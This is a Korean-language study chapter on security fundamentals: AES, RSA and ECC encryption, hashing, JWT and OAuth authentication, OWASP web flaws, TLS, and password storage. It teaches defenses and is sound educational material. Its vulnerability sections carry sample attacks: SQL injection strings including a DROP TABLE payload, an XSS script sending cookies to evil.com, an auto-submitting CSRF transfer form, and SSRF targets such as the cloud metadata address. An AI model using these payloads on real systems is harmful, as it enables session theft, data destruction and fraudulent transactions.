# 12. 보안 (Security)

보안은 컴퓨터 시스템에서 데이터와 서비스를 보호하는 모든 활동을 의미한다. 현대 소프트웨어 개발에서 보안은 선택이 아닌 필수이며, 설계 단계부터 고려해야 한다.

---

## 1. 암호화 (Encryption) ◑

### 암호화란 무엇인가? ◑

암호화는 원본 데이터(평문, Plaintext)를 읽을 수 없는 형태(암호문, Ciphertext)로 변환하는 과정이다. 암호화의 목적은 **기밀성(Confidentiality)** 을 보장하는 것이다.

```
평문 (Plaintext)  →  [암호화 알고리즘 + 키]  →  암호문 (Ciphertext)
"Hello World"     →  [AES + Key]           →  "U2FsdGVk..."

암호문 (Ciphertext)  →  [복호화 알고리즘 + 키]  →  평문 (Plaintext)
"U2FsdGVk..."        →  [AES + Key]            →  "Hello World"
```

암호화 시스템에서 알고리즘은 공개되어 있고, **키(Key)** 만 비밀로 유지된다. 이를 **케르크호프스의 원리(Kerckhoffs's Principle)** 라고 한다. 알고리즘의 비밀에 의존하는 보안은 안전하지 않다.

### 대칭키 vs 비대칭키

암호화 방식은 키의 사용 방법에 따라 크게 두 가지로 나뉜다.

| 구분 | 대칭키 (Symmetric) | 비대칭키 (Asymmetric) |
|------|--------|----------|
| 키 | 암호화/복호화에 동일한 키 사용 | 공개키/개인키 쌍 사용 |
| 속도 | 빠름 (1000배 이상 차이) | 느림 |
| 키 배포 | 어려움 (안전한 채널 필요) | 용이 (공개키는 누구에게나 공개) |
| 주요 용도 | 대량 데이터 암호화 | 키 교환, 인증, 전자서명 |
| 예시 | AES, DES, 3DES, ChaCha20 | RSA, ECC, DSA |

### ⭕ 대칭키와 비대칭키 암호화의 차이는?

**대칭키 암호화 (Symmetric Encryption)**

대칭키 암호화는 암호화와 복호화에 **동일한 키**를 사용한다. 마치 집 열쇠처럼 같은 열쇠로 문을 잠그고 열 수 있다.

```
Alice                                      Bob
  │                                          │
  │  "Hello"  ─→ [암호화: Key=K] ─→ "X#@!"  │
  │                                          │
  │  "X#@!"   ─→ [복호화: Key=K] ─→ "Hello" │
  │                                          │
  └──────────────────────────────────────────┘
                 동일한 키 K 공유
```

**장점**
- 암호화/복호화 속도가 매우 빠름
- 대용량 데이터 처리에 적합
- 알고리즘이 단순하여 구현이 용이

**단점 - 키 배포 문제 (Key Distribution Problem)**
- Alice와 Bob이 통신하려면 같은 키를 공유해야 함
- 키를 전달하는 과정에서 도청될 위험이 있음
- N명이 통신하려면 N(N-1)/2개의 키가 필요 (100명이면 4,950개)

**비대칭키 암호화 (Asymmetric Encryption)**

비대칭키 암호화는 수학적으로 연관된 **공개키(Public Key)** 와 **개인키(Private Key)** 쌍을 사용한다.

```
Bob의 키 쌍 생성:
┌─────────────────┐
│  공개키 (Pub)   │ ← 모두에게 공개
│  개인키 (Priv)  │ ← Bob만 보관
└─────────────────┘

Alice → Bob 암호화 통신:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Alice                                          Bob         │
│    │                                              │         │
│    │  "Hello" ─→ [암호화: Bob의 공개키] ─→ "X#@!"│         │
│    │                        ↓                     │         │
│    │              (인터넷으로 전송)               │         │
│    │                        ↓                     │         │
│    │               [복호화: Bob의 개인키]  ←──────┤         │
│    │                        ↓                     │         │
│    │                    "Hello"                   │         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**핵심 원리**
- 공개키로 암호화한 것은 **개인키로만** 복호화 가능
- 개인키로 암호화(서명)한 것은 **공개키로만** 검증 가능
- 공개키에서 개인키를 역산하는 것은 현실적으로 불가능

**장점**
- 키 배포 문제 해결 (공개키는 자유롭게 배포)
- N명이 통신할 때 N개의 키 쌍만 필요 (100명이면 100개)
- 전자서명 구현 가능

**단점**
- 대칭키 대비 1000배 이상 느림
- 키 길이가 긴 편 (RSA 2048비트 vs AES 256비트)

### 하이브리드 암호화 ◑

실제 시스템에서는 대칭키와 비대칭키의 장점을 결합한 **하이브리드 방식**을 사용한다.

```
1. 대칭키(세션 키) 생성
   Alice: 랜덤한 대칭키 K 생성

2. 대칭키를 비대칭키로 암호화하여 전송
   Alice → Bob: E(K, Bob의 공개키)

3. Bob이 대칭키 복호화
   Bob: D(암호화된 K, Bob의 개인키) = K

4. 이후 대칭키로 빠르게 통신
   Alice ←→ Bob: 대칭키 K로 암호화된 메시지
```

**HTTPS/TLS가 바로 이 방식을 사용한다.** 처음에는 RSA나 ECDH로 안전하게 키를 교환하고, 이후에는 AES로 빠르게 데이터를 주고받는다.

### AES (Advanced Encryption Standard) ◑

AES는 현재 가장 널리 사용되는 대칭키 암호화 알고리즘이다. 2001년 미국 NIST에서 표준으로 채택했다.

**AES 특징**

| 속성 | 값 |
|------|------|
| 종류 | 대칭키 블록 암호 |
| 블록 크기 | 128비트 (16바이트) |
| 키 길이 | 128, 192, 256비트 |
| 라운드 수 | 10, 12, 14 (키 길이에 따라) |

**블록 암호(Block Cipher)란?**

AES는 블록 암호이다. 데이터를 고정된 크기(128비트)의 블록으로 나누어 처리한다.

```
평문: "Hello World! This is a long message..."

블록 1: "Hello World! Thi" (16바이트)
블록 2: "s is a long mess" (16바이트)
블록 3: "age..."          (패딩 추가)
         ↓
각 블록을 AES로 개별 암호화
         ↓
암호문 블록들 연결
```

**운용 모드 (Mode of Operation)**

각 블록을 독립적으로 암호화하면 동일한 평문 블록은 동일한 암호문이 되어 패턴이 노출된다. 이를 방지하기 위해 다양한 운용 모드를 사용한다.

| 모드 | 설명 | 특징 |
|------|------|------|
| ECB | 각 블록 독립 암호화 | 패턴 노출, 사용 금지 |
| CBC | 이전 암호문 블록과 XOR | 순차 처리, 널리 사용 |
| CTR | 카운터를 암호화하여 XOR | 병렬 처리 가능 |
| GCM | CTR + 인증 태그 | 기밀성 + 무결성 제공, 권장 |

**AES-256-GCM**은 현재 가장 권장되는 조합이다. 미국 NSA에서 Top Secret 등급 정보 보호에 승인했다.

### RSA ◑

RSA는 가장 널리 사용되는 비대칭키 암호화 알고리즘이다. 1977년 Rivest, Shamir, Adleman이 발명했다.

**RSA의 수학적 원리**

RSA의 보안은 **큰 수의 소인수분해가 어렵다**는 사실에 기반한다.

```
키 생성 과정 (단순화):
1. 두 개의 큰 소수 p, q 선택 (각각 1024비트 이상)
2. n = p × q 계산 (이것이 모듈러)
3. φ(n) = (p-1)(q-1) 계산
4. e 선택 (보통 65537)
5. d 계산: e × d ≡ 1 (mod φ(n))

공개키: (e, n)
개인키: (d, n)

암호화: c = m^e mod n
복호화: m = c^d mod n
```

**왜 안전한가?**
- 공개키 (e, n)에서 개인키 d를 구하려면 n을 p × q로 분해해야 함
- 2048비트 n의 소인수분해는 현재 기술로 수십억 년이 걸림
- 단, **양자 컴퓨터**가 실용화되면 Shor's Algorithm으로 빠르게 분해 가능

**RSA 키 길이 권장사항**

| 키 길이 | 보안 수준 | 권장 여부 |
|---------|----------|----------|
| 1024비트 | 약함 | 사용 금지 |
| 2048비트 | 적절 | 2030년까지 권장 |
| 3072비트 | 강함 | 2030년 이후 권장 |
| 4096비트 | 매우 강함 | 장기 보안용 |

### ECC (Elliptic Curve Cryptography) ◑

타원 곡선 암호는 RSA보다 짧은 키 길이로 동일한 보안 수준을 제공한다.

| RSA 키 길이 | ECC 키 길이 | 보안 수준 |
|------------|------------|----------|
| 2048비트 | 224비트 | 112비트 |
| 3072비트 | 256비트 | 128비트 |
| 7680비트 | 384비트 | 192비트 |

ECC의 장점:
- 키가 짧아 연산이 빠름
- 모바일 환경, IoT에 적합
- 현대 TLS에서는 ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)가 기본

---

## 2. 해시 함수 (Hash Function) ◑

### 해시 함수란? ◑

해시 함수는 임의 크기의 입력을 **고정 크기의 출력**으로 변환하는 **단방향 함수**이다. 암호화와 달리 **역연산(복호화)이 불가능**하다.

```
입력 (임의 크기)          해시 함수          출력 (고정 크기)
────────────────         ──────────         ─────────────────
"Hello"                → SHA-256 →         185f8db32271fe25f561a6fc938b2e26...
                                           (256비트 = 64자의 16진수)

"Hello World"          → SHA-256 →         a591a6d40bf420404a011733cfb7b190...
                                           (256비트)

(1GB 파일)             → SHA-256 →         7f83b1657ff1fc53b92dc18148a1d65d...
                                           (256비트)
```

입력이 1비트만 달라져도 출력은 완전히 다른 값이 된다. 이를 **눈사태 효과(Avalanche Effect)** 라고 한다.

### 해시 함수의 필수 특성 ◑

**1. 단방향성 (One-way)**
- 해시값에서 원본을 계산하는 것이 불가능
- 유일한 방법은 모든 입력을 시도해보는 것 (브루트 포스)

**2. 결정성 (Deterministic)**
- 같은 입력은 항상 같은 해시값을 생성
- 언제, 어디서 계산해도 결과가 동일

**3. 충돌 저항성 (Collision Resistance)**
- 같은 해시값을 가지는 서로 다른 두 입력을 찾기 어려움
- 완벽한 충돌 방지는 수학적으로 불가능 (비둘기집 원리)
- 하지만 충돌을 찾는 것이 계산적으로 어려워야 함

**4. 역상 저항성 (Preimage Resistance)**
- 주어진 해시값에 대응하는 입력을 찾기 어려움

### 해시 알고리즘 비교 ◑

| 알고리즘 | 출력 길이 | 보안성 | 용도 |
|----------|----------|--------|------|
| MD5 | 128비트 | ❌ 취약 | 체크섬 (보안 용도 금지) |
| SHA-1 | 160비트 | ❌ 취약 | 레거시 시스템 |
| SHA-256 | 256비트 | ✅ 안전 | 범용 (파일 무결성, 블록체인) |
| SHA-3 | 가변 | ✅ 안전 | 차세대 표준 |
| bcrypt | 가변 | ✅ 안전 | 비밀번호 저장 |
| Argon2 | 가변 | ✅ 안전 | 비밀번호 저장 (권장) |

**MD5와 SHA-1이 취약한 이유**
- MD5: 2004년에 충돌 공격 성공. 동일한 해시를 가진 두 파일 생성 가능
- SHA-1: 2017년 Google이 SHA-1 충돌 공격 시연 (SHAttered)

### ⭕ 암호화와 해시의 차이는?

| 구분 | 암호화 (Encryption) | 해시 (Hash) |
|------|--------|------|
| 방향성 | **양방향** (복호화 가능) | **단방향** (복원 불가) |
| 키 사용 | 키 필요 | 키 없음 |
| 출력 크기 | 입력에 비례 | 항상 고정 |
| 목적 | 기밀성 (데이터 보호) | 무결성 (변조 확인) |
| 질문 | "나중에 원본이 필요한가?" | Yes → 암호화 / No → 해시 |

```
사용 사례:

1. 사용자 비밀번호 저장
   → 해시 (서버는 원본 비밀번호가 필요 없음)

2. 신용카드 번호 저장
   → 암호화 (결제 시 원본 필요)

3. 파일 다운로드 검증
   → 해시 (무결성 확인)

4. 메시지 전송
   → 암호화 (수신자가 읽어야 함)
```

### 해시의 활용 ◑

**1. 비밀번호 저장**
```
로그인 과정:
1. 사용자가 비밀번호 "mypassword123" 입력
2. 서버에서 hash("mypassword123") 계산
3. DB에 저장된 해시값과 비교
4. 일치하면 로그인 성공

장점: DB가 유출되어도 원본 비밀번호 노출 안 됨
```

**2. 파일 무결성 검증**
```
$ sha256sum ubuntu-22.04.iso
a1b2c3d4e5f6... ubuntu-22.04.iso

다운로드 후 해시값이 공식 사이트와 일치하는지 확인
→ 일치하면 파일이 변조되지 않음
```

**3. 블록체인**
```
블록 N:
├─ 이전 블록 해시: abc123...
├─ 트랜잭션들
└─ 현재 블록 해시: def456... (위 내용 전체를 해시)

블록 N+1:
├─ 이전 블록 해시: def456... (블록 N의 해시)
├─ 트랜잭션들
└─ 현재 블록 해시: ghi789...

→ 과거 블록 하나를 수정하면 모든 후속 블록의 해시가 변경됨
```

**4. Git 버전 관리**
```
Git은 모든 커밋을 SHA-1 해시로 식별
commit a1b2c3d4e5f6789...

파일 내용이 같으면 해시도 같음 → 중복 저장 방지
```

---

## 3. 인증과 인가 ◑

### ⭕ 인증(Authentication)과 인가(Authorization)의 차이는?

**인증(Authentication)** 과 **인가(Authorization)** 는 이름이 비슷하지만 완전히 다른 개념이다.

```
사무실 빌딩 비유:

인증 (Authentication) = "신분증 확인"
├─ 경비원: "신분증 보여주세요"
├─ 직원: (사원증 제시)
└─ 경비원: "네, 김철수 씨 맞군요" → 신원 확인 완료

인가 (Authorization) = "출입 권한 확인"
├─ 김철수: (서버실 출입 시도)
├─ 출입문: (권한 확인)
└─ 결과: "서버실 출입 권한이 없습니다" → 권한 부족
```

| 구분 | 인증 (Authentication) | 인가 (Authorization) |
|------|----------------------|---------------------|
| 질문 | "**당신은 누구인가?**" | "**당신은 무엇을 할 수 있는가?**" |
| 확인 | 신원(Identity) 확인 | 권한(Permission) 확인 |
| 순서 | **먼저** 수행 | 인증 **후** 수행 |
| 실패 시 | 401 Unauthorized | 403 Forbidden |
| 예시 | 로그인 | 관리자 페이지 접근, 파일 삭제 권한 |

**HTTP 응답 코드**
- `401 Unauthorized`: 인증 실패 (누군지 모름)
- `403 Forbidden`: 인가 실패 (누군지 알지만 권한 없음)

### 인증 방식 비교 ◑

#### 1. 세션 기반 인증 (Session-based)

가장 전통적인 인증 방식이다. 서버가 사용자의 로그인 상태를 **서버 메모리**에 저장한다.

```
[로그인 과정]

Client                                    Server
  │                                          │
  │ ─────── POST /login ────────────────────→│
  │         (username, password)             │
  │                                          │
  │                                     [인증 성공]
  │                                     [세션 생성: SID=abc123]
  │                                     [메모리에 저장: {abc123: user_info}]
  │                                          │
  │ ←────── Set-Cookie: SID=abc123 ─────────│
  │                                          │
  │                                          │
[이후 요청]                                   │
  │                                          │
  │ ─────── GET /profile ───────────────────→│
  │         Cookie: SID=abc123               │
  │                                          │
  │                                     [세션 조회: abc123 → user_info]
  │                                          │
  │ ←────── 200 OK + user data ─────────────│
```

**장점**
- 구현이 간단하고 이해하기 쉬움
- 서버에서 세션을 즉시 무효화 가능 (강제 로그아웃)
- 쿠키 크기가 작음

**단점**
- **서버 확장(Scaling) 어려움**: 여러 서버를 사용하면 세션 동기화 필요
- 서버 메모리 사용량 증가
- CSRF 공격에 취약

#### 2. 토큰 기반 인증 (Token-based: JWT)

서버가 상태를 저장하지 않는 **Stateless** 방식이다. 인증 정보가 토큰 자체에 포함된다.

```
[로그인 과정]

Client                                    Server
  │                                          │
  │ ─────── POST /login ────────────────────→│
  │         (username, password)             │
  │                                          │
  │                                     [인증 성공]
  │                                     [JWT 생성 및 서명]
  │                                          │
  │ ←────── { token: "eyJhbG..." } ─────────│
  │                                          │
  │                                          │
[이후 요청]                                   │
  │                                          │
  │ ─────── GET /profile ───────────────────→│
  │         Authorization: Bearer eyJhbG...  │
  │                                          │
  │                                     [JWT 서명 검증]
  │                                     [토큰에서 user_info 추출]
  │                                          │
  │ ←────── 200 OK + user data ─────────────│
```

**장점**
- **서버 확장 용이**: 서버가 상태를 저장하지 않음
- 마이크로서비스 환경에 적합
- CORS 문제 없음

**단점**
- 토큰 무효화가 어려움 (만료 전까지 유효)
- 토큰 크기가 세션 ID보다 큼
- Payload가 암호화되지 않음

### JWT (JSON Web Token) 상세 ◑

JWT는 세 부분으로 구성되며, `.`으로 구분된다.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────── Header ──────────────┘.└───────────────────── Payload ──────────────────────┘.└─────────── Signature ──────────┘
```

**1. Header** (알고리즘, 토큰 타입)
```json
{
  "alg": "HS256",   // 서명 알고리즘
  "typ": "JWT"      // 토큰 타입
}
```

**2. Payload** (클레임 - 실제 데이터)
```json
{
  "sub": "1234567890",      // Subject (사용자 ID)
  "name": "John Doe",       // 커스텀 클레임
  "iat": 1516239022,        // Issued At (발급 시간)
  "exp": 1516242622         // Expiration (만료 시간)
}
```

**3. Signature** (위변조 방지)
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

**⚠️ 중요: JWT Payload는 암호화되지 않는다**

Payload는 Base64로 **인코딩**만 되어 있어서 누구나 디코딩할 수 있다. 민감한 정보(비밀번호, 신용카드 번호 등)를 절대 넣으면 안 된다.

```
Base64 디코딩:
eyJzdWIiOiIxMjM0NTY3ODkwIn0  →  {"sub":"1234567890"}

Signature의 역할:
- 토큰이 위변조되었는지 검증
- secret 키가 없으면 유효한 서명 생성 불가
```

**JWT 보안 Best Practices**
1. 만료 시간(exp)을 짧게 설정 (15분~1시간)
2. Refresh Token과 함께 사용
3. HTTPS로만 전송
4. 민감한 정보는 Payload에 넣지 않기
5. 적절한 서명 알고리즘 선택 (HS256 또는 RS256)

#### 3. OAuth 2.0 ◑

OAuth는 제3자 애플리케이션에게 **사용자 대신** 제한된 접근 권한을 부여하는 프레임워크이다.

```
"Google 계정으로 로그인" 시나리오:

┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│   사용자       우리 앱 (Client)      Google (Authorization Server)  │
│      │               │                          │                   │
│      │ ─1. 로그인────→│                          │                   │
│      │               │                          │                   │
│      │ ←─2. Google로 ─┤                          │                   │
│      │    리다이렉트   │                          │                   │
│      │               │                          │                   │
│      │ ─────────────3. Google 로그인 페이지 ────→│                   │
│      │                                          │                   │
│      │              (사용자가 Google에서 로그인)  │                   │
│      │                                          │                   │
│      │ ←──────────4. Authorization Code ────────│                   │
│      │               (우리 앱으로 리다이렉트)     │                   │
│      │               │                          │                   │
│      │               │ ─5. Code → Token 교환 ──→│                   │
│      │               │                          │                   │
│      │               │ ←──6. Access Token ──────│                   │
│      │               │                          │                   │
│      │               │ ─7. API 호출 (Token) ───→│                   │
│      │               │                          │                   │
│      │               │ ←──8. 사용자 정보 ────────│                   │
│      │               │                          │                   │
│      │ ←9. 로그인 완료┤                          │                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

**OAuth의 핵심: 비밀번호를 공유하지 않음**
- 사용자는 Google에만 비밀번호를 입력
- 우리 앱은 사용자의 Google 비밀번호를 모름
- 우리 앱은 제한된 권한(이메일 읽기 등)의 토큰만 받음

### 다중 요소 인증 (MFA) ◑

MFA는 **두 가지 이상의 인증 요소**를 조합하여 보안을 강화한다.

```
인증 요소의 세 가지 범주:

┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  지식 (Something you know)     소유 (Something you have)    │
│  ┌─────────────────────┐       ┌─────────────────────┐     │
│  │ - 비밀번호          │       │ - 스마트폰 (OTP)    │     │
│  │ - PIN 번호          │       │ - 보안 카드         │     │
│  │ - 보안 질문 답변    │       │ - 하드웨어 토큰     │     │
│  └─────────────────────┘       │ - 이메일 인증       │     │
│                                └─────────────────────┘     │
│                                                             │
│            특성 (Something you are)                        │
│            ┌─────────────────────┐                         │
│            │ - 지문              │                         │
│            │ - 얼굴 인식         │                         │
│            │ - 홍채 인식         │                         │
│            │ - 음성 인식         │                         │
│            └─────────────────────┘                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**왜 "다중 요소"인가?**
- 비밀번호 + 비밀번호 = 단일 요소 (지식 + 지식)
- 비밀번호 + OTP = 다중 요소 (지식 + 소유)

공격자가 비밀번호를 알아내도 스마트폰까지 훔쳐야 로그인 가능

---

## 4. 웹 보안 취약점 (OWASP Top 10) ◑

OWASP(Open Web Application Security Project)는 웹 애플리케이션의 가장 심각한 보안 위험을 정기적으로 발표한다.

### ⭕ SQL Injection이란? 방어 방법은?

SQL Injection은 사용자 입력을 통해 **악의적인 SQL 쿼리**를 주입하는 공격이다. OWASP Top 10에서 오랜 기간 1위를 차지했던 대표적인 취약점이다.

**취약한 코드 예시**

```python
# 위험한 코드 (문자열 연결)
username = request.GET['username']
query = "SELECT * FROM users WHERE username = '" + username + "'"
cursor.execute(query)
```

**공격 시나리오**

```
정상 입력: admin
→ SELECT * FROM users WHERE username = 'admin'

악의적 입력: ' OR '1'='1
→ SELECT * FROM users WHERE username = '' OR '1'='1'
                                            ~~~~~~~~
                                            항상 참!
→ 모든 사용자 정보 유출

더 위험한 입력: '; DROP TABLE users; --
→ SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
                                          ~~~~~~~~~~~~~~~~~~~~
                                          테이블 삭제!
```

**방어 방법**

**1. Prepared Statement (파라미터화된 쿼리) - 가장 효과적**
```python
# 안전한 코드
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, [username])
```

사용자 입력이 SQL 구문이 아닌 **데이터**로만 처리됨

**2. ORM(Object-Relational Mapping) 사용**
```python
# Django ORM
User.objects.filter(username=username)
```

**3. 입력값 검증 및 이스케이프**
- 화이트리스트 기반 검증 (허용된 문자만 통과)
- SQL 특수문자 이스케이프 (', ", ; 등)

**4. 최소 권한 원칙**
- DB 계정에 꼭 필요한 권한만 부여
- 웹 애플리케이션 계정은 DROP, DELETE 권한 제거

**5. 에러 메시지 숨기기**
- DB 에러 상세 내용을 사용자에게 노출 금지
- 공격자에게 DB 구조 힌트를 제공하게 됨

### ⭕ XSS (Cross-Site Scripting)란?

XSS는 웹 페이지에 **악성 스크립트를 삽입**하여 다른 사용자의 브라우저에서 실행시키는 공격이다.

**XSS 유형**

| 유형 | 저장 위치 | 설명 |
|------|----------|------|
| Stored XSS | 서버 DB | 게시글, 댓글에 스크립트 저장 |
| Reflected XSS | URL | URL 파라미터의 스크립트가 응답에 반영 |
| DOM-based XSS | 클라이언트 | JavaScript로 DOM 조작 시 발생 |

**Stored XSS 예시**

```html
<!-- 공격자가 게시판에 작성한 글 -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

<!-- 다른 사용자가 게시글을 열람하면 -->
<!-- 해당 사용자의 쿠키(세션)가 공격자에게 전송됨 -->
```

**Reflected XSS 예시**

```
정상 URL:
https://shop.com/search?q=laptop

악성 URL (피싱 이메일로 배포):
https://shop.com/search?q=<script>alert('XSS')</script>

검색 결과 페이지에서:
<p>검색 결과: <script>alert('XSS')</script></p>
→ 스크립트 실행!
```

**방어 방법**

**1. 출력 시 HTML 이스케이프**
```html
< → &lt;
> → &gt;
& → &amp;
" → &quot;
' → &#x27;

<script> → &lt;script&gt; (실행되지 않음)
```

**2. Content Security Policy (CSP)**
```http
Content-Security-Policy: script-src 'self'
```
외부 스크립트 로드 및 인라인 스크립트 실행 제한

**3. HttpOnly 쿠키**
```http
Set-Cookie: session=abc123; HttpOnly
```
JavaScript에서 쿠키 접근 불가 → 쿠키 탈취 방지

**4. 입력값 검증**
- HTML 태그 허용 시 화이트리스트 기반 필터링
- 위험한 태그/속성 제거 (script, onclick, onerror 등)

### ⭕ CSRF (Cross-Site Request Forgery)란?

CSRF는 사용자가 **인증된 상태**에서 공격자가 의도한 요청을 **사용자 모르게** 실행하게 만드는 공격이다.

```
CSRF 공격 시나리오:

1. 사용자가 은행 사이트에 로그인 (세션 유지)
   bank.com 세션 쿠키: session=abc123

2. 사용자가 공격자의 이메일/웹사이트 방문

3. 공격자 사이트에 숨겨진 폼:
   <img src="https://bank.com/transfer?to=hacker&amount=1000000">
   또는
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="hacker">
     <input type="hidden" name="amount" value="1000000">
   </form>
   <script>document.forms[0].submit()</script>

4. 브라우저가 bank.com에 요청 시 자동으로 쿠키 첨부
   Cookie: session=abc123

5. 은행 서버는 정상적인 요청으로 인식하여 송금 처리
```

**CSRF vs XSS 차이**
- XSS: 악성 스크립트를 **대상 사이트 내에서** 실행
- CSRF: **다른 사이트에서** 대상 사이트로 요청 전송

**방어 방법**

**1. CSRF 토큰**
```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random_token_abc123">
  <input type="text" name="amount">
  <button type="submit">송금</button>
</form>
```
- 서버가 폼에 랜덤 토큰 삽입
- 요청 시 토큰 검증
- 공격자는 이 토큰 값을 알 수 없음

**2. SameSite 쿠키**
```http
Set-Cookie: session=abc123; SameSite=Strict
```
- `Strict`: 다른 사이트에서 오는 모든 요청에 쿠키 미포함
- `Lax`: GET 요청은 허용, POST 등은 차단

**3. Referer/Origin 헤더 검증**
```python
if request.headers['Origin'] != 'https://bank.com':
    return 403  # 거부
```

### SSRF (Server-Side Request Forgery) ◑

SSRF는 **서버를 속여서** 서버가 내부 네트워크나 외부 서비스에 요청을 보내게 만드는 공격이다.

```
정상적인 기능:
사용자 → 서버: "이 URL의 이미지를 가져와줘: https://example.com/image.png"
서버 → example.com: 이미지 요청
서버 → 사용자: 이미지 반환

SSRF 공격:
사용자 → 서버: "이 URL의 이미지를 가져와줘: http://localhost/admin"
                                         또는 http://169.254.169.254/...
서버 → 내부 시스템: 요청 (방화벽을 우회하여 접근)
서버 → 사용자: 내부 정보 유출
```

**주요 공격 대상**
- `http://localhost`, `http://127.0.0.1`: 서버 자체
- `http://192.168.x.x`, `http://10.x.x.x`: 내부 네트워크
- `http://169.254.169.254`: AWS/클라우드 메타데이터 서버 (자격 증명 탈취)

**방어 방법**
- URL 화이트리스트 적용
- 내부 IP 대역 차단
- DNS Rebinding 방지

---

## 5. 네트워크 보안 ◑

### HTTPS와 TLS ◑

**HTTPS = HTTP + TLS**

TLS(Transport Layer Security)는 통신 내용을 암호화하여 **기밀성**, **무결성**, **인증**을 제공한다.

```
HTTP (암호화 없음):
┌──────────┐           (도청 가능)          ┌──────────┐
│  Client  │ ──── "password=abc123" ───────→│  Server  │
└──────────┘                                 └──────────┘

HTTPS (TLS 암호화):
┌──────────┐           (도청해도 의미 없음)  ┌──────────┐
│  Client  │ ──── "X#@!%^&*..." ───────────→│  Server  │
└──────────┘                                 └──────────┘
```

### TLS 핸드셰이크 상세 과정 ◑

```
┌─────────────────────────────────────────────────────────────────────┐
│                     TLS 1.3 핸드셰이크                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Client                                          Server             │
│    │                                                │               │
│    │ ─── 1. ClientHello ───────────────────────────→│               │
│    │     - 지원하는 TLS 버전                         │               │
│    │     - 지원하는 암호화 스위트 목록                │               │
│    │     - 클라이언트 랜덤값                         │               │
│    │     - 키 공유 파라미터 (ECDHE)                  │               │
│    │                                                │               │
│    │ ←── 2. ServerHello + 인증서 + 서명 ────────────│               │
│    │     - 선택된 TLS 버전                          │               │
│    │     - 선택된 암호화 스위트                      │               │
│    │     - 서버 랜덤값                              │               │
│    │     - 서버 키 공유 파라미터                     │               │
│    │     - 서버 인증서 (공개키 포함)                 │               │
│    │                                                │               │
│    │  [인증서 검증]                                  │               │
│    │  - 발급자(CA) 확인                             │               │
│    │  - 유효기간 확인                               │               │
│    │  - 도메인 일치 확인                            │               │
│    │                                                │               │
│    │  [키 도출]                                     │               │
│    │  - 양측의 키 파라미터로 동일한 세션 키 계산     │               │
│    │                                                │               │
│    │ ═══════════════════════════════════════════════│               │
│    │          암호화된 통신 시작 (대칭키 사용)        │               │
│    │ ═══════════════════════════════════════════════│               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

**TLS 1.3의 개선점**
- 핸드셰이크 1-RTT (이전 버전은 2-RTT)
- 취약한 암호화 알고리즘 제거 (RC4, 3DES, SHA-1 등)
- 모든 핸드셰이크 메시지 암호화
- 0-RTT 재연결 지원 (옵션)

### 인증서와 PKI ◑

**인증서(Certificate)** 는 "이 공개키는 이 도메인의 것이다"를 신뢰할 수 있는 기관(CA)이 보증하는 문서이다.

```
인증서 체인 (Chain of Trust):

Root CA (최상위 인증 기관)
├─ 브라우저/OS에 미리 내장됨
└─ 예: DigiCert, Let's Encrypt, GlobalSign

    │
    │ 서명
    ↓

Intermediate CA (중간 인증 기관)
├─ Root CA가 서명
└─ 실제 인증서 발급 담당

    │
    │ 서명
    ↓

End-Entity Certificate (최종 인증서)
├─ 특정 도메인에 대한 인증서
└─ 예: *.google.com
```

**인증서 검증 과정**
1. 서버가 인증서 + 체인 전송
2. 클라이언트가 체인을 따라 올라가며 서명 검증
3. 최종적으로 Root CA까지 도달하면 신뢰

### 방화벽 (Firewall) ◑

방화벽은 네트워크 트래픽을 **규칙에 따라 필터링**하는 보안 시스템이다.

```
인터넷  ─────→ [방화벽] ─────→ 내부 네트워크
              ↓
        규칙에 따라
        허용/차단 결정
```

**방화벽 유형**

| 유형 | 동작 계층 | 특징 |
|------|----------|------|
| 패킷 필터링 | L3-L4 | IP, 포트 기반 필터링 |
| 상태 검사 (Stateful) | L3-L4 | 연결 상태 추적, 관련 패킷 자동 허용 |
| 애플리케이션 (WAF) | L7 | HTTP 내용 검사, SQL Injection 방어 |

**iptables 규칙 예시**
```bash
# 80, 443 포트만 외부에서 접근 허용
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -j DROP  # 나머지 차단
```

### VPN (Virtual Private Network) ◑

VPN은 **공용 네트워크에서 암호화된 터널**을 통해 마치 사설 네트워크처럼 안전한 통신을 제공한다.

```
VPN 없이:
사용자 ──→ (인터넷, 평문) ──→ 회사 서버
           ↑
        도청 가능

VPN 사용:
사용자 ══► [VPN 클라이언트] ══► (인터넷, 암호화) ══► [VPN 서버] ──→ 회사 서버
                              ↑
                         도청해도 의미 없음
```

**VPN 활용**
- 원격 근무 시 회사 내부망 접근
- 공용 Wi-Fi에서 안전한 통신
- 지역 제한 콘텐츠 접근

---

## 6. 비밀번호 보안 ◑

### 안전한 비밀번호 저장 ◑

**절대 하면 안 되는 것**: 비밀번호를 평문이나 단순 암호화로 저장

```
❌ 잘못된 방법들:
1. 평문 저장:     password = "mypassword123"
2. 단순 암호화:   password = encrypt("mypassword123", key)
   → 키 유출 시 모든 비밀번호 복원 가능
3. 단순 해시:     password = SHA256("mypassword123")
   → 레인보우 테이블 공격 가능
```

**올바른 방법**: 솔트(Salt) + 느린 해시 함수

```
✅ 안전한 저장 과정:

1. 각 사용자마다 랜덤 솔트 생성
   salt = random(16 bytes)  # 예: "x7Gh9kL2"

2. 비밀번호 + 솔트를 해시
   hash = bcrypt(password + salt, cost=12)

3. DB에 솔트와 해시 함께 저장
   | user_id | salt     | password_hash                |
   |---------|----------|------------------------------|
